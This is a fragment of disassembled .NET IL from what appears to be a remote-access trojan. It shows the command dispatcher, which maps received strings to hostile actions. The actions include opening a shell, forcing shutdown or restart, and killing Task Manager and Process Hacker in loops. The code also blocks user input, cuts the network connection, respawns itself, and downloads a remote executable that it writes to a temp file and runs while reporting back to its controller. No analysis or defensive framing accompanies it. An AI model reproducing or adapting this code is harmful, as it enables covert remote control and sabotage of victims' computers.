      IL_0a43:  br.s       IL_0a7d

      IL_0a45:  nop
      IL_0a46:  ldloc.s    V_63
      IL_0a48:  ldstr      "@"
      IL_0a4d:  ldc.i4.0
      IL_0a4e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0a53:  ldc.i4.0
      IL_0a54:  ceq
      IL_0a56:  stloc.s    V_73
      IL_0a58:  ldloc.s    V_73
      IL_0a5a:  brfalse.s  IL_0a7d

      IL_0a5c:  nop
      IL_0a5d:  ldc.i4.0
      IL_0a5e:  call       void j.OK::pr(int32)
      IL_0a63:  nop
      IL_0a64:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0a69:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0a6e:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_0a73:  pop
      IL_0a74:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_0a79:  nop
      IL_0a7a:  nop
      IL_0a7b:  br.s       IL_0a7d

      IL_0a7d:  nop
      IL_0a7e:  nop
      IL_0a7f:  leave      IL_12be

      IL_0a84:  br         IL_0df9

      IL_0a89:  nop
      IL_0a8a:  ldloc.s    V_55
      IL_0a8c:  ldstr      "farmanmsg"
      IL_0a91:  ldc.i4.0
      IL_0a92:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0a97:  ldc.i4.0
      IL_0a98:  ceq
      IL_0a9a:  stloc.s    V_73
      IL_0a9c:  ldloc.s    V_73
      IL_0a9e:  brfalse.s  IL_0abb

      IL_0aa0:  nop
      IL_0aa1:  ldstr      ""
      IL_0aa6:  ldloc.0
      IL_0aa7:  ldc.i4.1
      IL_0aa8:  ldelem.ref
      IL_0aa9:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0aae:  ldc.i4.0
      IL_0aaf:  ldnull
      IL_0ab0:  call       valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.MsgBoxResult [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::MsgBox(object,
                                                                                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.MsgBoxStyle,
                                                                                                                                                                object)
      IL_0ab5:  pop
      IL_0ab6:  br         IL_0df9

      IL_0abb:  nop
      IL_0abc:  ldloc.s    V_55
      IL_0abe:  ldstr      "cmdbkawa"
      IL_0ac3:  ldc.i4.0
      IL_0ac4:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0ac9:  ldc.i4.0
      IL_0aca:  ceq
      IL_0acc:  stloc.s    V_73
      IL_0ace:  ldloc.s    V_73
      IL_0ad0:  brfalse.s  IL_0ae6

      IL_0ad2:  nop
      IL_0ad3:  ldstr      "cmd"
      IL_0ad8:  ldc.i4.2
      IL_0ad9:  ldc.i4.0
      IL_0ada:  ldc.i4.m1
      IL_0adb:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0ae0:  pop
      IL_0ae1:  br         IL_0df9

      IL_0ae6:  nop
      IL_0ae7:  ldloc.s    V_55
      IL_0ae9:  ldstr      "restartbka"
      IL_0aee:  ldc.i4.0
      IL_0aef:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0af4:  ldc.i4.0
      IL_0af5:  ceq
      IL_0af7:  stloc.s    V_73
      IL_0af9:  ldloc.s    V_73
      IL_0afb:  brfalse.s  IL_0b11

      IL_0afd:  nop
      IL_0afe:  ldstr      "shutdown -r"
      IL_0b03:  ldc.i4.2
      IL_0b04:  ldc.i4.0
      IL_0b05:  ldc.i4.m1
      IL_0b06:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0b0b:  pop
      IL_0b0c:  br         IL_0df9

      IL_0b11:  nop
      IL_0b12:  ldloc.s    V_55
      IL_0b14:  ldstr      "shutdownwbka"
      IL_0b19:  ldc.i4.0
      IL_0b1a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0b1f:  ldc.i4.0
      IL_0b20:  ceq
      IL_0b22:  stloc.s    V_73
      IL_0b24:  ldloc.s    V_73
      IL_0b26:  brfalse.s  IL_0b3c

      IL_0b28:  nop
      IL_0b29:  ldstr      "shutdown -s"
      IL_0b2e:  ldc.i4.2
      IL_0b2f:  ldc.i4.0
      IL_0b30:  ldc.i4.m1
      IL_0b31:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0b36:  pop
      IL_0b37:  br         IL_0df9

      IL_0b3c:  nop
      IL_0b3d:  ldloc.s    V_55
      IL_0b3f:  ldstr      "cdbkawa"
      IL_0b44:  ldc.i4.0
      IL_0b45:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0b4a:  ldc.i4.0
      IL_0b4b:  ceq
      IL_0b4d:  stloc.s    V_73
      IL_0b4f:  ldloc.s    V_73
      IL_0b51:  brfalse.s  IL_0b6b

      IL_0b53:  nop
      IL_0b54:  ldstr      "set CDAudio door open"
      IL_0b59:  ldnull
      IL_0b5a:  ldc.i4.0
      IL_0b5b:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0b60:  call       int32 j.OK::mciSendString(string,
                                                     class [mscorlib]System.Text.StringBuilder,
                                                     int32,
                                                     native int)
      IL_0b65:  pop
      IL_0b66:  br         IL_0df9

      IL_0b6b:  nop
      IL_0b6c:  ldloc.s    V_55
      IL_0b6e:  ldstr      "cdbkawabardawam"
      IL_0b73:  ldc.i4.0
      IL_0b74:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0b79:  ldc.i4.0
      IL_0b7a:  ceq
      IL_0b7c:  stloc.s    V_73
      IL_0b7e:  ldloc.s    V_73
      IL_0b80:  brfalse.s  IL_0ba4

      IL_0b82:  nop
      IL_0b83:  br.s       IL_0b98

      IL_0b85:  ldstr      "set CDAudio door open"
      IL_0b8a:  ldnull
      IL_0b8b:  ldc.i4.0
      IL_0b8c:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0b91:  call       int32 j.OK::mciSendString(string,
                                                     class [mscorlib]System.Text.StringBuilder,
                                                     int32,
                                                     native int)
      IL_0b96:  pop
      IL_0b97:  nop
      IL_0b98:  ldc.i4.1
      IL_0b99:  stloc.s    V_73
      IL_0b9b:  ldloc.s    V_73
      IL_0b9d:  brtrue.s   IL_0b85

      IL_0b9f:  br         IL_0df9

      IL_0ba4:  nop
      IL_0ba5:  ldloc.s    V_55
      IL_0ba7:  ldstr      "openweb"
      IL_0bac:  ldc.i4.0
      IL_0bad:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0bb2:  ldc.i4.0
      IL_0bb3:  ceq
      IL_0bb5:  stloc.s    V_73
      IL_0bb7:  ldloc.s    V_73
      IL_0bb9:  brfalse.s  IL_0bd4

      IL_0bbb:  nop
      IL_0bbc:  ldstr      ""
      IL_0bc1:  ldloc.0
      IL_0bc2:  ldc.i4.1
      IL_0bc3:  ldelem.ref
      IL_0bc4:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0bc9:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_0bce:  pop
      IL_0bcf:  br         IL_0df9

      IL_0bd4:  nop
      IL_0bd5:  ldloc.s    V_55
      IL_0bd7:  ldstr      "disabletsk"
      IL_0bdc:  ldc.i4.0
      IL_0bdd:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0be2:  ldc.i4.0
      IL_0be3:  ceq
      IL_0be5:  stloc.s    V_73
      IL_0be7:  ldloc.s    V_73
      IL_0be9:  brfalse.s  IL_0c38

      IL_0beb:  nop
      IL_0bec:  br.s       IL_0c2c

      IL_0bee:  ldstr      "TaskMgr"
      IL_0bf3:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
      IL_0bf8:  stloc.s    V_65
      IL_0bfa:  ldc.i4.0
      IL_0bfb:  stloc.s    V_64
      IL_0bfd:  br.s       IL_0c15

      IL_0bff:  ldloc.s    V_65
      IL_0c01:  ldloc.s    V_64
      IL_0c03:  ldelem.ref
      IL_0c04:  stloc.s    V_34
      IL_0c06:  ldloc.s    V_34
      IL_0c08:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_0c0d:  nop
      IL_0c0e:  ldloc.s    V_64
      IL_0c10:  ldc.i4.1
      IL_0c11:  add.ovf
      IL_0c12:  stloc.s    V_64
      IL_0c14:  nop
      IL_0c15:  ldloc.s    V_64
      IL_0c17:  ldloc.s    V_65
      IL_0c19:  ldlen
      IL_0c1a:  conv.ovf.i4
      IL_0c1b:  clt
      IL_0c1d:  stloc.s    V_73
      IL_0c1f:  ldloc.s    V_73
      IL_0c21:  brtrue.s   IL_0bff

      IL_0c23:  ldc.i4.s   100
      IL_0c25:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0c2a:  nop
      IL_0c2b:  nop
      IL_0c2c:  ldc.i4.1
      IL_0c2d:  stloc.s    V_73
      IL_0c2f:  ldloc.s    V_73
      IL_0c31:  brtrue.s   IL_0bee

      IL_0c33:  br         IL_0df9

      IL_0c38:  nop
      IL_0c39:  ldloc.s    V_55
      IL_0c3b:  ldstr      "disablepros"
      IL_0c40:  ldc.i4.0
      IL_0c41:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0c46:  ldc.i4.0
      IL_0c47:  ceq
      IL_0c49:  stloc.s    V_73
      IL_0c4b:  ldloc.s    V_73
      IL_0c4d:  brfalse.s  IL_0c9c

      IL_0c4f:  nop
      IL_0c50:  br.s       IL_0c90

      IL_0c52:  ldstr      "ProcessHacker"
      IL_0c57:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
      IL_0c5c:  stloc.s    V_67
      IL_0c5e:  ldc.i4.0
      IL_0c5f:  stloc.s    V_66
      IL_0c61:  br.s       IL_0c79

      IL_0c63:  ldloc.s    V_67
      IL_0c65:  ldloc.s    V_66
      IL_0c67:  ldelem.ref
      IL_0c68:  stloc.s    V_35
      IL_0c6a:  ldloc.s    V_35
      IL_0c6c:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_0c71:  nop
      IL_0c72:  ldloc.s    V_66
      IL_0c74:  ldc.i4.1
      IL_0c75:  add.ovf
      IL_0c76:  stloc.s    V_66
      IL_0c78:  nop
      IL_0c79:  ldloc.s    V_66
      IL_0c7b:  ldloc.s    V_67
      IL_0c7d:  ldlen
      IL_0c7e:  conv.ovf.i4
      IL_0c7f:  clt
      IL_0c81:  stloc.s    V_73
      IL_0c83:  ldloc.s    V_73
      IL_0c85:  brtrue.s   IL_0c63

      IL_0c87:  ldc.i4.s   100
      IL_0c89:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0c8e:  nop
      IL_0c8f:  nop
      IL_0c90:  ldc.i4.1
      IL_0c91:  stloc.s    V_73
      IL_0c93:  ldloc.s    V_73
      IL_0c95:  brtrue.s   IL_0c52

      IL_0c97:  br         IL_0df9

      IL_0c9c:  nop
      IL_0c9d:  ldloc.s    V_55
      IL_0c9f:  ldstr      "mousestop"
      IL_0ca4:  ldc.i4.0
      IL_0ca5:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0caa:  ldc.i4.0
      IL_0cab:  ceq
      IL_0cad:  stloc.s    V_73
      IL_0caf:  ldloc.s    V_73
      IL_0cb1:  brfalse.s  IL_0cd3

      IL_0cb3:  nop
      IL_0cb4:  ldloca.s   V_69
      IL_0cb6:  ldc.i4     0x1f4
      IL_0cbb:  ldc.i4     0x1f4
      IL_0cc0:  call       instance void [System.Drawing]System.Drawing.Point::.ctor(int32,
                                                                                     int32)
      IL_0cc5:  nop
      IL_0cc6:  ldloc.s    V_69
      IL_0cc8:  call       void [System.Windows.Forms]System.Windows.Forms.Cursor::set_Position(valuetype [System.Drawing]System.Drawing.Point)
      IL_0ccd:  nop
      IL_0cce:  br         IL_0df9

      IL_0cd3:  nop
      IL_0cd4:  ldloc.s    V_55
      IL_0cd6:  ldstr      "keymoo"
      IL_0cdb:  ldc.i4.0
      IL_0cdc:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0ce1:  ldc.i4.0
      IL_0ce2:  ceq
      IL_0ce4:  stloc.s    V_73
      IL_0ce6:  ldloc.s    V_73
      IL_0ce8:  brfalse.s  IL_0d13

      IL_0cea:  nop
      IL_0ceb:  br.s       IL_0d07

      IL_0ced:  ldc.i4.1
      IL_0cee:  call       int32 j.OK::apiBlockInput(int32)
      IL_0cf3:  pop
      IL_0cf4:  ldc.i4     0xbb8
      IL_0cf9:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0cfe:  nop
      IL_0cff:  ldc.i4.0
      IL_0d00:  call       int32 j.OK::apiBlockInput(int32)
      IL_0d05:  pop
      IL_0d06:  nop
      IL_0d07:  ldc.i4.1
      IL_0d08:  stloc.s    V_73
      IL_0d0a:  ldloc.s    V_73
      IL_0d0c:  brtrue.s   IL_0ced

      IL_0d0e:  br         IL_0df9

      IL_0d13:  nop
      IL_0d14:  ldloc.s    V_55
      IL_0d16:  ldstr      "wifibstop"
      IL_0d1b:  ldc.i4.0
      IL_0d1c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0d21:  ldc.i4.0
      IL_0d22:  ceq
      IL_0d24:  stloc.s    V_73
      IL_0d26:  ldloc.s    V_73
      IL_0d28:  brfalse.s  IL_0d3e

      IL_0d2a:  nop
      IL_0d2b:  ldstr      "cmd.exe /c ipconfig/release"
      IL_0d30:  ldc.i4.2
      IL_0d31:  ldc.i4.0
      IL_0d32:  ldc.i4.m1
      IL_0d33:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0d38:  pop
      IL_0d39:  br         IL_0df9

      IL_0d3e:  nop
      IL_0d3f:  ldloc.s    V_55
      IL_0d41:  ldstr      "wifibstart"
      IL_0d46:  ldc.i4.0
      IL_0d47:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0d4c:  ldc.i4.0
      IL_0d4d:  ceq
      IL_0d4f:  stloc.s    V_73
      IL_0d51:  ldloc.s    V_73
      IL_0d53:  brfalse.s  IL_0d69

      IL_0d55:  nop
      IL_0d56:  ldstr      "cmd.exe /c ipconfig/renew"
      IL_0d5b:  ldc.i4.2
      IL_0d5c:  ldc.i4.0
      IL_0d5d:  ldc.i4.m1
      IL_0d5e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0d63:  pop
      IL_0d64:  br         IL_0df9

      IL_0d69:  nop
      IL_0d6a:  ldloc.s    V_55
      IL_0d6c:  ldstr      "notepa"
      IL_0d71:  ldc.i4.0
      IL_0d72:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0d77:  ldc.i4.0
      IL_0d78:  ceq
      IL_0d7a:  stloc.s    V_73
      IL_0d7c:  ldloc.s    V_73
      IL_0d7e:  brfalse.s  IL_0d91

      IL_0d80:  nop
      IL_0d81:  ldstr      "NotePad"
      IL_0d86:  ldc.i4.2
      IL_0d87:  ldc.i4.0
      IL_0d88:  ldc.i4.m1
      IL_0d89:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0d8e:  pop
      IL_0d8f:  br.s       IL_0df9

      IL_0d91:  nop
      IL_0d92:  ldloc.s    V_55
      IL_0d94:  ldstr      "cpuki"
      IL_0d99:  ldc.i4.0
      IL_0d9a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0d9f:  ldc.i4.0
      IL_0da0:  ceq
      IL_0da2:  stloc.s    V_73
      IL_0da4:  ldloc.s    V_73
      IL_0da6:  brfalse.s  IL_0dc5

      IL_0da8:  nop
      IL_0da9:  br.s       IL_0dbc

      IL_0dab:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::GetExecutingAssembly()
      IL_0db0:  callvirt   instance string [mscorlib]System.Reflection.Assembly::get_Location()
      IL_0db5:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_0dba:  pop
      IL_0dbb:  nop
      IL_0dbc:  ldc.i4.1
      IL_0dbd:  stloc.s    V_73
      IL_0dbf:  ldloc.s    V_73
      IL_0dc1:  brtrue.s   IL_0dab

      IL_0dc3:  br.s       IL_0df9

      IL_0dc5:  nop
      IL_0dc6:  ldloc.s    V_55
      IL_0dc8:  ldstr      "coloreko"
      IL_0dcd:  ldc.i4.0
      IL_0dce:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0dd3:  ldc.i4.0
      IL_0dd4:  ceq
      IL_0dd6:  stloc.s    V_73
      IL_0dd8:  ldloc.s    V_73
      IL_0dda:  brfalse.s  IL_0df9

      IL_0ddc:  nop
      IL_0ddd:  ldc.i4.s   20
      IL_0ddf:  ldc.i4.2
      IL_0de0:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Blue()
      IL_0de5:  stloc.s    V_70
      IL_0de7:  ldloca.s   V_70
      IL_0de9:  call       instance string [System.Drawing]System.Drawing.Color::get_Name()
      IL_0dee:  stloc.s    V_58
      IL_0df0:  ldloca.s   V_58
      IL_0df2:  ldc.i4.1
      IL_0df3:  call       int32 j.OK::SystemParametersInfo(int32,
                                                            int32,
                                                            string&,
                                                            int32)
      IL_0df8:  pop
      IL_0df9:  nop
      IL_0dfa:  ldloc.s    V_7
      IL_0dfc:  ldstr      "up"
      IL_0e01:  ldc.i4.0
      IL_0e02:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0e07:  ldc.i4.0
      IL_0e08:  ceq
      IL_0e0a:  ldc.i4.0
      IL_0e0b:  ceq
      IL_0e0d:  stloc.s    V_73
      IL_0e0f:  ldloc.s    V_73
      IL_0e11:  brfalse.s  IL_0e18

      IL_0e13:  br         IL_0ff3

      IL_0e18:  nop
      IL_0e19:  ldnull
      IL_0e1a:  stloc.2
      IL_0e1b:  ldloc.0
      IL_0e1c:  ldc.i4.1
      IL_0e1d:  ldelem.ref
      IL_0e1e:  ldc.i4.0
      IL_0e1f:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
      IL_0e24:  ldc.i4.s   31
      IL_0e26:  ceq
      IL_0e28:  stloc.s    V_73
      IL_0e2a:  ldloc.s    V_73
      IL_0e2c:  brfalse    IL_0ec6

      IL_0e31:  nop
      .try
      {
        IL_0e32:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0e37:  stloc.s    V_37
        IL_0e39:  ldloc.0
        IL_0e3a:  ldc.i4.0
        IL_0e3b:  ldelem.ref
        IL_0e3c:  ldsfld     string j.OK::Y
        IL_0e41:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0e46:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_0e4b:  stloc.s    V_36
        IL_0e4d:  ldloc.s    V_37
        IL_0e4f:  ldarg.0
        IL_0e50:  ldloc.s    V_36
        IL_0e52:  ldarg.0
        IL_0e53:  ldlen
        IL_0e54:  conv.ovf.i4
        IL_0e55:  ldloc.s    V_36
        IL_0e57:  sub.ovf
        IL_0e58:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0e5d:  nop
        IL_0e5e:  ldloc.s    V_37
        IL_0e60:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0e65:  call       uint8[] j.OK::ZIP(uint8[])
        IL_0e6a:  stloc.2
        IL_0e6b:  nop
        IL_0e6c:  leave      IL_0f30

        IL_0e71:  leave.s    IL_0ec5

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0e73:  dup
        IL_0e74:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0e79:  stloc.s    V_38
        IL_0e7b:  nop
        IL_0e7c:  ldloc.s    V_38
        IL_0e7e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0e83:  nop
        IL_0e84:  ldloc.s    V_38
        IL_0e86:  stloc.s    V_39
        IL_0e88:  ldstr      "MSG"
        IL_0e8d:  ldsfld     string j.OK::Y
        IL_0e92:  ldstr      "Update ERROR"
        IL_0e97:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0e9c:  call       bool j.OK::Send(string)
        IL_0ea1:  pop
        IL_0ea2:  ldstr      "bla"
        IL_0ea7:  call       bool j.OK::Send(string)
        IL_0eac:  pop
        IL_0ead:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0eb2:  nop
        IL_0eb3:  nop
        IL_0eb4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0eb9:  leave      IL_12be

        IL_0ebe:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0ec3:  leave.s    IL_0ec5

      }  // end handler
      IL_0ec5:  nop
      IL_0ec6:  nop
      IL_0ec7:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_0ecc:  stloc.s    V_4
      IL_0ece:  nop
      .try
      {
        IL_0ecf:  ldloc.s    V_4
        IL_0ed1:  ldloc.0
        IL_0ed2:  ldc.i4.1
        IL_0ed3:  ldelem.ref
        IL_0ed4:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_0ed9:  stloc.2
        IL_0eda:  leave.s    IL_0f2e

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0edc:  dup
        IL_0edd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0ee2:  stloc.s    V_40
        IL_0ee4:  nop
        IL_0ee5:  ldloc.s    V_40
        IL_0ee7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0eec:  nop
        IL_0eed:  ldloc.s    V_40
        IL_0eef:  stloc.s    V_41
        IL_0ef1:  ldstr      "MSG"
        IL_0ef6:  ldsfld     string j.OK::Y
        IL_0efb:  ldstr      "Update ERROR"
        IL_0f00:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0f05:  call       bool j.OK::Send(string)
        IL_0f0a:  pop
        IL_0f0b:  ldstr      "bla"
        IL_0f10:  call       bool j.OK::Send(string)
        IL_0f15:  pop
        IL_0f16:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0f1b:  nop
        IL_0f1c:  nop
        IL_0f1d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0f22:  leave      IL_12be

        IL_0f27:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0f2c:  leave.s    IL_0f2e

      }  // end handler
      IL_0f2e:  nop
      IL_0f2f:  nop
      IL_0f30:  nop
      IL_0f31:  ldstr      "bla"
      IL_0f36:  call       bool j.OK::Send(string)
      IL_0f3b:  pop
      IL_0f3c:  call       string [mscorlib]System.IO.Path::GetTempFileName()
      IL_0f41:  ldstr      ".exe"
      IL_0f46:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0f4b:  stloc.s    V_5
      IL_0f4d:  nop
      .try
      {
        IL_0f4e:  ldstr      "MSG"
        IL_0f53:  ldsfld     string j.OK::Y
        IL_0f58:  ldstr      "Updating To "
        IL_0f5d:  ldloc.s    V_5
        IL_0f5f:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_0f64:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
        IL_0f69:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0f6e:  call       bool j.OK::Send(string)
        IL_0f73:  pop
        IL_0f74:  ldc.i4     0x7d0
        IL_0f79:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
        IL_0f7e:  nop
        IL_0f7f:  ldloc.s    V_5
        IL_0f81:  ldloc.2
        IL_0f82:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_0f87:  nop
        IL_0f88:  ldloc.s    V_5
        IL_0f8a:  ldstr      ".."
        IL_0f8f:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string,
                                                                                                                string)
        IL_0f94:  pop
        IL_0f95:  leave.s    IL_0fe5

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0f97:  dup
        IL_0f98:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0f9d:  stloc.s    V_42
        IL_0f9f:  nop
        IL_0fa0:  ldloc.s    V_42
        IL_0fa2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0fa7:  nop
        IL_0fa8:  ldloc.s    V_42
        IL_0faa:  stloc.s    V_43
        IL_0fac:  ldstr      "MSG"
        IL_0fb1:  ldsfld     string j.OK::Y
        IL_0fb6:  ldstr      "Update ERROR "
        IL_0fbb:  ldloc.s    V_43
        IL_0fbd:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_0fc2:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0fc7:  call       bool j.OK::Send(string)
        IL_0fcc:  pop
        IL_0fcd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0fd2:  nop
        IL_0fd3:  nop
        IL_0fd4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0fd9:  leave      IL_12be

        IL_0fde:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0fe3:  leave.s    IL_0fe5

      }  // end handler
      IL_0fe5:  nop
      IL_0fe6:  call       void j.OK::UNS()
      IL_0feb:  nop
      IL_0fec:  nop
      IL_0fed:  leave      IL_12be

      IL_0ff2:  nop
      IL_0ff3:  nop
      IL_0ff4:  ldloc.s    V_7
      IL_0ff6:  ldstr      "Ex"
      IL_0ffb:  ldc.i4.0
      IL_0ffc:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1001:  ldc.i4.0
      IL_1002:  ceq
      IL_1004:  stloc.s    V_73
      IL_1006:  ldloc.s    V_73
      IL_1008:  brfalse    IL_10f9

      IL_100d:  ldsfld     object j.OK::PLG
      IL_1012:  ldnull
      IL_1013:  ceq
      IL_1015:  stloc.s    V_72
      IL_1017:  ldloc.s    V_72
